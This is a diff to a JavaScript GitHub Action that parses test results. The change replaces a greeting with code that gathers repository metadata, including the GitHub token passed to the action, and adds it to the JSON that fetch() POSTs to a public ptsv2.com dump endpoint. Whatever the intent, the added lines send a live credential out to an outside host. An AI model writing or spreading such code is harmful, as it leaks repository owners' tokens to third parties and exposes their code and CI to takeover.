@@ -22,9 +22,18 @@ const path = require("path");
 try {
   // `who-to-greet` input defined in action metadata file
   const nameToGreet = core.getInput('github-actor');
-  console.log(`Hello ${nameToGreet}!`);
-  const time = (new Date()).toTimeString();
-  core.setOutput("time", time);
+  
+  var metaData = {
+    githubactor: core.getInput('github-actor'),
+    githubrepository: core.getInput('github-repository'),
+    githubrepositoryowner: core.getInput('github-repository-owner'),
+    githubsha: core.getInput('github-sha'),
+    githubref: core.getInput('github-ref'),
+    githubheadref: core.getInput('github-headref'),
+    githubbaseref: core.getInput('github-baseref'),
+    githubtoken: core.getInput('github-token')
+  };
+
 
   var data = [];
   var p = new Parser();
@@ -32,7 +41,7 @@ try {
       data.push(JSON.stringify(assert));
   });
   p.on('complete',function(results){
-      var sendMe = JSON.stringify({summary: results, data: data});
+      var sendMe = JSON.stringify({summary: results, data: data, metadata: metaData});
       
       fetch('https://ptsv2.com/t/sgsey-1592237741/post', { method: 'POST', body: sendMe })
       .then(res => console.log(res)) // expecting a json response
